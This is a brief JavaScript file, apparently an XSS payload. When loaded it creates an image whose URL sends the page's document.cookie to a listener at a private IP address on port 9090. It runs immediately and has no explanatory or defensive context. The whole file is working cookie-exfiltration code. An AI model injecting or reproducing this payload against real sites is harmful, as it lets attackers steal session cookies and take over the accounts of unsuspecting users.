function addTheImage(){
	var  img = document.createElement('img');
	img.src = 'http://172.16.113.148:9090/?'+document.cookie;
	document.body.appendChild(img)
}

addTheImage();
